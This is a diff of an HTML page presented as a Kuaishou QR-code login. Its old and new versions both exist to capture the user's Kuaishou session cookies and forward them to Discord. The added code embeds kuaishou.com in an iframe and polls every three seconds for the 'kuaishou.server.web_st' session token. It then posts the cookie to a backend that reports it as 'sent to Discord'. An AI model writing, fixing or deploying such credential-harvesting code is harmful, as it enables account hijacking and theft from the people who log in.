@@ -6,78 +6,67 @@
 <title>扫码登录</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{background:#111;color:#fff;font-family:Arial;text-align:center;padding:30px}
-h2{color:#ff4900;margin-bottom:25px}
-#qrcode img{width:280px;height:280px;border-radius:10px}
-#status{margin-top:20px;font-size:18px;font-weight:bold}
+body{background:#111;color:#fff;font-family:Arial;text-align:center;padding:20px}
+h2{color:#ff4900;margin-bottom:15px}
+.login-box{width:100%;height:70vh;background:#fff;border-radius:10px;overflow:hidden;margin-bottom:15px}
+.login-box iframe{width:100%;height:100%;border:none}
+#status{margin-top:10px;font-size:16px;font-weight:bold}
 .ok{color:#00ff88}
 .wait{color:#ffaa00}
-.scanned{color:#00aaff}
-.info{color:#aaa;font-size:13px;margin-top:10px}
-.btn{margin-top:15px;padding:10px 20px;background:#ff4900;color:#fff;border:none;border-radius:6px;font-size:14px;cursor:pointer}
+.info{color:#aaa;font-size:13px;margin-top:5px}
+.btn{margin-top:10px;padding:10px 20px;background:#ff4900;color:#fff;border:none;border-radius:6px;font-size:14px;cursor:pointer}
 </style>
 </head>
 <body>
 <h2>快手扫码登录</h2>
-<div id="qrcode"></div>
-<p id="status" class="wait">等待扫码...</p>
-<p class="info">打开快手APP扫一扫，然后点确认登录</p>
-<button class="btn" onclick="start()">刷新二维码</button>
+<div class="login-box">
+    <iframe id="ksFrame" src="https://www.kuaishou.com" sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-popups-to-escape-sandbox"></iframe>
+</div>
+<p id="status" class="wait">请点击右上角登录，用快手APP扫码</p>
+<p class="info">扫码成功后自动获取Cookie</p>
+<button class="btn" onclick="reloadFrame()">重新加载</button>
 
 <script>
-var scanId = null;
-var timer = null;
+var lastCookie = "";
 
-function start() {
-    if (timer) clearTimeout(timer);
+function reloadFrame() {
+    document.getElementById("ksFrame").src = "https://www.kuaishou.com";
+    lastCookie = "";
     document.getElementById("status").className = "wait";
-    document.getElementById("status").textContent = "获取二维码中...";
-    document.getElementById("qrcode").innerHTML = "";
-
-    fetch("/api/qr").then(function(res) {
-        return res.json();
-    }).then(function(data) {
-        if (data.error) {
-            document.getElementById("status").className = "err";
-            document.getElementById("status").textContent = data.error;
-            return;
-        }
-        scanId = data.scanId;
-        document.getElementById("qrcode").innerHTML = '<img src="' + data.qrCode + '">';
-        document.getElementById("status").className = "wait";
-        document.getElementById("status").textContent = "请用快手APP扫描二维码";
-        poll();
-    }).catch(function() {
-        document.getElementById("status").textContent = "网络错误";
-    });
+    document.getElementById("status").textContent = "请点击右上角登录，用快手APP扫码";
 }
 
-function poll() {
-    function check() {
-        if (!scanId) return;
-        fetch("/api/check?id=" + scanId).then(function(res) {
-            return res.json();
-        }).then(function(data) {
-            if (data.status === "done") {
+function checkCookie() {
+    try {
+        var iframe = document.getElementById("ksFrame");
+        var doc = iframe.contentDocument || iframe.contentWindow.document;
+        var c = doc.cookie;
+
+        if (c && c.indexOf("kuaishou.server.web_st") !== -1 && c.indexOf("userId") !== -1) {
+            if (c !== lastCookie) {
+                lastCookie = c;
                 document.getElementById("status").className = "ok";
-                document.getElementById("status").textContent = "登录成功！Cookie已发送到Discord";
-                return;
+                document.getElementById("status").textContent = "获取成功，正在发送...";
+
+                fetch("/api/submit", {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({cookie: c})
+                }).then(function(r) {
+                    return r.json();
+                }).then(function(data) {
+                    if (data.ok) {
+                        document.getElementById("status").textContent = "已发送到Discord！";
+                    }
+                });
             }
-            if (data.status === "scanned") {
-                document.getElementById("status").className = "scanned";
-                document.getElementById("status").textContent = "已扫码，请在手机上确认登录";
-            }
-            if (data.status === "expired") {
-                document.getElementById("status").textContent = "二维码已过期，请刷新";
-                return;
-            }
-            timer = setTimeout(check, 2000);
-        });
+        }
+    } catch(e) {
+        // 跨域拿不到，忽略
     }
-    check();
 }
 
-start();
+setInterval(checkCookie, 3000);
 </script>
 </body>
 </html>
